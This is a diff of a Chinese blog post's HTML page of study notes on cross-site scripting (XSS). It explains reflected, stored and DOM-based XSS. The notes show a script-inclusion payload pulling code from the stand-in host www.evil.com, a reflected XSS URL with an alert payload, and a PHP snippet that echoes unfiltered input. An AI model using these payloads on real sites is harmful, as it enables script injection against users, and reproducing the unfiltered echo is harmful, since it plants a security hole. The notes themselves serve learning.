@@ -665,7 +665,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-07-26 11:30:50'>2020-07-26 10:44</time>
+        创建时间:<time class="date" title='更新时间: 2020-07-26 11:33:15'>2020-07-26 10:44</time>
         
     </div>
     <div class="article-meta">
@@ -721,7 +721,7 @@
 <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>&emsp;&emsp;XSS全称为跨站脚本(Cross Site Scripting)。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击。</p>
 <p>&emsp;&emsp;很多时候输入的内容长度是有限制的。真正的XSS弹窗毫无意义，所以攻击代码可能会比较长，一般注入类似的下面的引用第三方域上的脚本<code>&lt;script&gt;src=&quot;http://www.evil.com/xss.js&quot;&gt;&lt;/script&gt;</code></p>
 <h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>&emsp;&emsp;发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像是一次反射，故称为反射型XSS。</p>
-<p>&emsp;&emsp;一个简单的例子，在<a href="http://www.foo.com/xss/reflect1.php代码如下`" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php代码如下`</a><?php echo $_GET['x'] ?><code>，输入的x的值未经任何过滤就直接输出，可以提交：</code><a href="http://www.foo.com/xss/reflect1.php?x=" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php?x=</a><script>alert(/hello<del>/)</script><code>，服务端解析时，echo就会完整地输出</code><script>alert(/you are hacked by V, haha</del>/)</script>`到响应体中，然后浏览器解析执行触发。【彩蛋哈哈】</p>
+<p>&emsp;&emsp;一个简单的例子，在<a href="http://www.foo.com/xss/reflect1.php代码如下`" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php代码如下`</a><?php echo $_GET['x'] ?><code>，输入的x的值未经任何过滤就直接输出，可以提交：</code><a href="http://www.foo.com/xss/reflect1.php?x=" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php?x=</a><script>alert(/Hello,/)</script><code>，服务端解析时，echo就会完整地输出</code><script>alert(/you are hacked by V, haha!/)</script>`到响应体中，然后浏览器解析执行触发。【彩蛋哈哈】</p>
 <h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于；提交的XSS代码会存储在服务端，下次请求目标页面时不用再提交XSS代码，最典型的例子是留言板XSS。</p>
 <p>&emsp;&emsp;除了留言板，如果服务端有一些记录ip的的功能甚至可以用X-Forwarded-For打XSS，见<a href="https://xz.aliyun.com/t/7887" target="_blank" rel="noopener">信呼OA存储型XSS 0day复现</a></p>
 <h3 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h3><p>&emsp;&emsp;DOM型 XSS与反射型、存储型的差别在于，DOM型 XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事。</p>
@@ -984,7 +984,7 @@
     <p><span class="copy-title">文章字数:</span><span class="post-count">7.8k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
     <p><span class="copy-title">发布时间:</span>2020-07-26, 10:44:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-07-26, 11:30:50</p>
+    <p><span class="copy-title">最后更新:</span>2020-07-26, 11:33:15</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/07/26/Web学习笔记 之 XSS/" title="Web学习笔记 之 XSS">http://jayxv.github.io/2020/07/26/Web学习笔记 之 XSS/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
